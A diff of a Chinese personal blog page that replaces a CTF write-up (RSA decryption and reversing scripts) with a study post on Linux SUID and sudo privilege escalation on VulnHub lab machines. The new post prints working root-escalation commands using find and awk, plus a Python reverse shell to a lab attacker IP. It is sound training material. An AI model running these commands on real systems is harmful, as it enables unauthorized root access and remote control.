@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://xhxbb1.github.io/2026/05/31/第十届御网杯网络安全大赛wp/"/>
+    <link rel="canonical" href="https://xhxbb1.github.io/2026/07/25/一些提权学习-2/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,16 +133,16 @@
         
         <meta name="description" content="学习记录，生活记录">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第十届御网杯网络安全大赛wp">
-<meta property="og:url" content="https://xhxbb1.github.io/2026/05/31/%E7%AC%AC%E5%8D%81%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp/index.html">
+<meta property="og:title" content="一些提权学习(2)">
+<meta property="og:url" content="https://xhxbb1.github.io/2026/07/25/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0-2/index.html">
 <meta property="og:site_name" content="xhxbb blog">
 <meta property="og:description" content="学习记录，生活记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-05-31T04:47:46.000Z">
-<meta property="article:modified_time" content="2026-07-24T09:22:34.073Z">
+<meta property="article:published_time" content="2026-07-25T03:32:08.000Z">
+<meta property="article:modified_time" content="2026-07-26T12:56:03.591Z">
 <meta property="article:author" content="xhxbb">
-<meta property="article:tag" content="wp">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
     
@@ -156,7 +156,7 @@
     
     <title>
         
-            第十届御网杯网络安全大赛wp | xhxbb的博客
+            一些提权学习(2) | xhxbb的博客
         
     </title>
 
@@ -662,7 +662,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">第十届御网杯网络安全大赛wp</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">一些提权学习(2)</h1>
 			</div>
 			
 		</div>
@@ -683,15 +683,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-05-31 12:47:46</span>
-        <span class="mobile">2026-05-31 12:47:46</span>
+        <span class="desktop">2026-07-25 11:32:08</span>
+        <span class="mobile">2026-07-25 11:32:08</span>
         <span class="hover-info">创建</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-07-24 17:22:34</span>
-            <span class="mobile">2026-07-24 17:22:34</span>
+            <span class="desktop">2026-07-26 20:56:03</span>
+            <span class="mobile">2026-07-26 20:56:03</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -703,7 +703,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/wp/">wp</a>&nbsp;
+                        <a href="/tags/%E6%8F%90%E6%9D%83/">提权</a>&nbsp;
                     </li>
                 
             </ul>
@@ -729,102 +729,230 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h2 id="一、Babyrsa"><a href="#一、Babyrsa" class="headerlink" title="一、Babyrsa"></a>一、Babyrsa</h2><h3 id="题目截图"><a href="#题目截图" class="headerlink" title="题目截图"></a>题目截图</h3><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目中 RSA 加密指数 <code>e = 3</code> 非常小，且明文 <code>m</code> 的立方小于模数 <code>n</code>，因此可以直接对密文 <code>c</code> 开三次方根得到明文。</p>
-<p><strong>解密脚本：</strong></p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">62364870116010424579856986224866318598943667575322329029992379199144881682310128246842388261808447999911515848128317783330982959826328847122736925239748769808906810038056387539225016357454342999716867225014056222140430643619945771535239017740246516288720117531417737478668384039267194218004944866754236473143</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">2217344750798307351107884404883186392024717286582728792622392458827535569286065686664154238860425984670745343425604930152583551079584945215761127415461153070725981937630533517990833293356809387438502145314432121871771562219710842241279945379559694541987723833309929898606437</span></span><br><span class="line"></span><br><span class="line">m, exact = gmpy2.iroot(c, e)</span><br><span class="line"><span class="keyword">if</span> exact:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;失败&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>原理：</strong> 当 $m^e &lt; n$ 时，$c &#x3D; m^e \bmod n &#x3D; m^e$，直接开 $e$ 次方即可恢复明文。</p>
-<hr>
-<h2 id="二、ScatterRSA"><a href="#二、ScatterRSA" class="headerlink" title="二、ScatterRSA"></a>二、ScatterRSA</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目给出了多组 RSA 加密，每组使用不同的模数但加密相同的明文。利用中国剩余定理（CRT）构造多项式，再使用 Coppersmith’s small_roots 方法求解。</p>
-<p><strong>Sage 脚本：</strong></p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">T1 = inverse_mod(N1, n1) * N1</span><br><span class="line">T2 = inverse_mod(N2, n2) * N2</span><br><span class="line">T3 = inverse_mod(N3, n3) * N3</span><br><span class="line"></span><br><span class="line">f = (</span><br><span class="line">    T1 * ((a1*x + b1)^<span class="number">3</span> - c1)</span><br><span class="line">    + T2 * ((a2*x + b2)^<span class="number">3</span> - c2)</span><br><span class="line">    + T3 * ((a3*x + b3)^<span class="number">3</span> - c3)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] start small_roots&quot;</span>)</span><br><span class="line"></span><br><span class="line">roots = f.small_roots(</span><br><span class="line">    X=<span class="number">2</span>^<span class="number">512</span>,</span><br><span class="line">    beta=<span class="number">1.0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> roots:</span><br><span class="line">    m = Integer(r)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>原理：</strong> 利用 CRT 将多个同余方程合并为一个在较大模数下的方程，然后利用 Coppersmith 方法求解小根。</p>
-<hr>
-<h2 id="三、Rerere"><a href="#三、Rerere" class="headerlink" title="三、Rerere"></a>三、Rerere</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li>从 <code>start</code> 进入，发现 <code>sub_140001180()</code>，进入。</li>
-<li>进入 <code>sub_140001180()</code> 后发现 <code>Code = sub_1400014FB()</code>，进入查看。</li>
-<li>核心逻辑：先提示输入，获取长度进行判断，flag 长度为 38 位：</li>
-</ol>
-<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n38 == <span class="number">38</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)sub_140001480(Buffer))</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br></pre></td></tr></table></figure></div>
-
-<ol start="4">
-<li>进入 <code>sub_140001480()</code> 分析核心加密逻辑：</li>
-</ol>
-<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140001480</span><span class="params">(__int64 p_Buffer, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (a2 &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (byte_140004060[*(_BYTE *)(p_Buffer + v2) ^ byte_140004048[v2 &amp; <span class="number">7</span>]] == byte_140004020[v2])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (++v2 == a2)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>核心逻辑：</strong> 取输入字符串第 i 个字符，与 <code>byte_140004048[i &amp; 7]</code> 对应字节进行异或，将异或结果作为索引访问 <code>byte_140004060</code> 表，将结果与 <code>byte_140004020[i]</code>（目标数组）进行比较，全部匹配则正确。</p>
-<ol start="5">
-<li>三个关键数组：</li>
-</ol>
-<ul>
-<li><strong>byte_140004060（256 字节置换表）：</strong></li>
-</ul>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[0xC2, 0x23, 0x97, 0x49, 0x83, 0xF6, 0xD3, 0xA7, 0xEB, 0xBF, 0x78, 0xC3, 0x29, 0x56, 0xD2, 0x1A,</span><br><span class="line"> 0x13, 0xBC, 0x21, 0x6A, 0x37, 0x8E, 0x5F, 0x0C, 0xB4, 0x46, 0xDE, 0xE4, 0x6C, 0xA2, 0x66, 0x30,</span><br><span class="line"> 0x0F, 0xA4, 0xBB, 0x8C, 0x09, 0x4B, 0x3D, 0x32, 0x42, 0x55, 0x2D, 0x4F, 0xF9, 0x77, 0x1B, 0x74,</span><br><span class="line"> 0x1F, 0x71, 0x7B, 0x9D, 0x73, 0xC4, 0xAB, 0xD0, 0xF3, 0xC1, 0x88, 0x07, 0xDC, 0xCE, 0xEF, 0xC0,</span><br><span class="line"> 0x72, 0x4A, 0x27, 0x81, 0x9B, 0xEE, 0xC7, 0x28, 0x26, 0x5A, 0x94, 0x54, 0x70, 0xD1, 0xE9, 0xC8,</span><br><span class="line"> 0x98, 0x36, 0x91, 0x41, 0xB8, 0x3A, 0x79, 0x0A, 0x08, 0xE5, 0xAF, 0x80, 0x24, 0xAE, 0x00, 0x19,</span><br><span class="line"> 0xCC, 0x7A, 0xF7, 0x51, 0x7D, 0x69, 0xEC, 0x03, 0x65, 0x25, 0x1C, 0x01, 0xF5, 0xE6, 0xBD, 0xD9,</span><br><span class="line"> 0x59, 0xFE, 0x92, 0xB0, 0x10, 0x6F, 0xF0, 0xE3, 0x9F, 0xAD, 0x84, 0xF4, 0xA5, 0x33, 0x35, 0x48,</span><br><span class="line"> 0x53, 0xB1, 0xE0, 0xD8, 0x05, 0x38, 0x18, 0x68, 0xA9, 0x14, 0xC6, 0x3F, 0x61, 0x8A, 0x31, 0x3B,</span><br><span class="line"> 0xBA, 0x2B, 0x4E, 0xE2, 0x57, 0x9A, 0xF1, 0xEA, 0x64, 0x7E, 0xA0, 0x93, 0xB6, 0xDA, 0x60, 0x2E,</span><br><span class="line"> 0x1D, 0x5B, 0x82, 0x34, 0x6D, 0xFC, 0xCF, 0x7F, 0xE7, 0x96, 0x67, 0x43, 0x06, 0x44, 0xC9, 0x4C,</span><br><span class="line"> 0x40, 0xDB, 0xFD, 0x4D, 0xB5, 0xED, 0x39, 0x2C, 0xB3, 0x17, 0x9E, 0xCD, 0xFA, 0x6B, 0xCA, 0x87,</span><br><span class="line"> 0x8F, 0x9C, 0x89, 0x0E, 0x63, 0x45, 0x86, 0xAA, 0x5E, 0x95, 0x16, 0xC5, 0xD5, 0x2F, 0xA1, 0xF8,</span><br><span class="line"> 0x99, 0xFF, 0x3C, 0x0D, 0x3E, 0xD4, 0x04, 0x76, 0xD7, 0x47, 0x20, 0x8D, 0xDF, 0x5C, 0x7C, 0xA3,</span><br><span class="line"> 0x1E, 0x8B, 0x15, 0xB9, 0xA8, 0xCB, 0x22, 0xA6, 0x52, 0xD6, 0xFB, 0x5D, 0xDD, 0xB2, 0x6E, 0xE8,</span><br><span class="line"> 0xF2, 0xE1, 0x2A, 0x58, 0x62, 0x12, 0x11, 0x50, 0x75, 0xB7, 0xAC, 0x90, 0x0B, 0x85, 0x02, 0xBE]</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><strong>byte_140004048（8 字节 XOR Key）：</strong></li>
-</ul>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0xB9, 0xCD, 0xCE, 0x30, 0xB8, 0x61, 0x4E, 0xAA]</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>注：由于 <code>v2 &amp; 7</code> 的掩码操作，实际只使用前 8 个字节。</p>
+			<blockquote>
+<p>学习获取到web权限or普通用户权限在Linux服务器上的SUID&amp;SUDO提权</p>
 </blockquote>
-<ul>
-<li><strong>byte_140004020（38 字节目标数组 &#x2F; flag 密文）：</strong></li>
-</ul>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0xA3, 0x5B, 0x4C, 0x0A, 0x0E, 0x98, 0x4F, 0xF8, 0x14, 0x90, 0xAC, 0xF6, 0x14, 0x41, 0x9F, 0x95,</span><br><span class="line"> 0x5C, 0x02, 0x50, 0x97, 0x61, 0xC2, 0x9F, 0x4E, 0x61, 0x02, 0x11, 0x3A, 0x20, 0x97, 0x42, 0xC5,</span><br><span class="line"> 0x8A, 0x96, 0xAC, 0x83, 0x3B, 0x6C]</span><br></pre></td></tr></table></figure></div>
+<h1 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h1><p>SUID（Set User ID） 是 Linux 文件权限中的一种特殊权限，全称是 Set User ID upon execution，中文一般叫 设置用户 ID 位。</p>
+<p>简单理解：</p>
+<blockquote>
+<p><strong>普通用户执行一个带 SUID 权限的程序时，程序会临时获得文件所有者的权限运行。</strong></p>
+</blockquote>
+<p>也就是说：</p>
+<p><strong>执行者身份 ≠ 程序运行身份</strong></p>
+<blockquote>
+<p>也就是说，root因某些原因给某文件了suid，执行时也有参数，可以执行其他命令出来，就造成了提权漏洞。</p>
+</blockquote>
+<p>例如：find命令，赋予suid之后参数可以执行出其他命令出来，这样就造成了提权漏洞。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -exec &quot;whoami&quot;\;</span><br></pre></td></tr></table></figure></div>
 
-<ol start="6">
-<li><strong>逆向解密脚本：</strong></li>
+<p>上面内容查找了.&#x2F;，也执行了whoami</p>
+<p>查找相应文件：</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找带有SUID的文件</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找带有GUID的文件</span></span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="靶机一（suid入门）"><a href="#靶机一（suid入门）" class="headerlink" title="靶机一（suid入门）"></a>靶机一（suid入门）</h1><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/" >https://www.vulnhub.com/entry/dc-1,292/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>首先nmap信息收集，打开是DrupalCMS，和之前一样打。</p>
+<p>获取用户权限后上传检测脚本。</p>
+<p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng" >https://github.com/peass-ng/PEASS-ng<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/897.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">find . -exec /bin/sh -p \; -quit</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">/bin/sh: 0: Illegal option -p</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>使用该网站项目<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.org/%EF%BC%8C%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83%EF%BC%8C%E5%A4%B1%E8%B4%A5%E4%BA%86" >https://gtfobins.org/，尝试提权，失败了<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>尝试<code>find . -exec /bin/sh \; -quit</code></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>
+
+<p>成功</p>
+<p>flag</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="靶机二（suid进阶）"><a href="#靶机二（suid进阶）" class="headerlink" title="靶机二（suid进阶）"></a>靶机二（suid进阶）</h1><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/" >https://www.vulnhub.com/entry/toppo-1,245/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>&#x2F;admin&#x2F;notes.txt,泄露密码。</p>
+<blockquote>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note to myself :</span><br><span class="line"></span><br><span class="line">I need to change my password :/ 12345ted123 is too outdated but the technology isn&#x27;t my thing i prefer go fishing or watching soccer .</span><br></pre></td></tr></table></figure></div></blockquote>
+<p>也开放了ssh，22端口，xshell连接。</p>
+<p>连接成功，查看当前权限：</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:~$ id</span><br><span class="line">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span><br></pre></td></tr></table></figure></div>
+
+<p>使用传输工具上传检测脚本：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/879.png"
+                     
+                ></p>
+<p>随后赋予执行权限并执行，以下是可利用的suid文件：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/302.png"
+                     
+                ></p>
+<p>这里&#x2F;usr&#x2F;bin&#x2F;python2.7有suid，直接反弹shell到本地也就获取了root权限。</p>
+<p>攻击机先监听到1234端口：</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234        </span><br><span class="line">listening on [any] 1234 ...</span><br></pre></td></tr></table></figure></div>
+
+<p>进行反弹操作</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python2.7 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.222.128&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/938.png"
+                     
+                ></p>
+<p>提权成功。</p>
+<hr>
+<p>当前靶机也可以使用sudo提权</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/660.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ted@Toppo:/tmp$ cat /etc/sudoers</span><br><span class="line">ted ALL=(ALL) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/751.png"
+                     
+                ></p>
+<p>提权成功。</p>
+<h1 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h1><p>sudo是 Linux&#x2F;Unix 系统中的一个权限提升命令，全称是 SuperUser DO（以超级用户身份执行）。</p>
+<p>简单理解：</p>
+<blockquote>
+<p>sudo 允许普通用户临时借用 root（管理员）的权限执行某个命令。</p>
+</blockquote>
+<p>查看sudo：</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="靶机三（sudo-CVE）"><a href="#靶机三（sudo-CVE）" class="headerlink" title="靶机三（sudo&amp;CVE）"></a>靶机三（sudo&amp;CVE）</h1><p>找到目标ip,</p>
+<p>8585端口存在git泄露，使用工具。</p>
+<p>提取出文件如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/131.png"
+                     
+                ></p>
+<p>访问&#x2F;adminer.php，是一个数据库登录界面，在配置文件种有数据库密码的泄露，进行登录。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/908.png"
+                     
+                ></p>
+<p>成功登录进去，获取账号密码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/192.png"
+                     
+                ></p>
+<p>网站后台地址如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/573.png"
+                     
+                ></p>
+<p>但是密码是加密的，两个解决思路：</p>
+<blockquote>
+<ol>
+<li>去翻下载下来的网站源代码，搞清楚密码的加密方式</li>
+<li>新建数据，将新建的数据加到管理员组里面，再用自己已知的账号登录。</li>
 </ol>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x97</span>, <span class="number">0x49</span>, <span class="number">0x83</span>, <span class="number">0xF6</span>, <span class="number">0xD3</span>, <span class="number">0xA7</span>, <span class="number">0xEB</span>, <span class="number">0xBF</span>, <span class="number">0x78</span>, <span class="number">0xC3</span>, <span class="number">0x29</span>, <span class="number">0x56</span>, <span class="number">0xD2</span>, <span class="number">0x1A</span>,</span><br><span class="line">         <span class="number">0x13</span>, <span class="number">0xBC</span>, <span class="number">0x21</span>, <span class="number">0x6A</span>, <span class="number">0x37</span>, <span class="number">0x8E</span>, <span class="number">0x5F</span>, <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x46</span>, <span class="number">0xDE</span>, <span class="number">0xE4</span>, <span class="number">0x6C</span>, <span class="number">0xA2</span>, <span class="number">0x66</span>, <span class="number">0x30</span>,</span><br><span class="line">         <span class="number">0x0F</span>, <span class="number">0xA4</span>, <span class="number">0xBB</span>, <span class="number">0x8C</span>, <span class="number">0x09</span>, <span 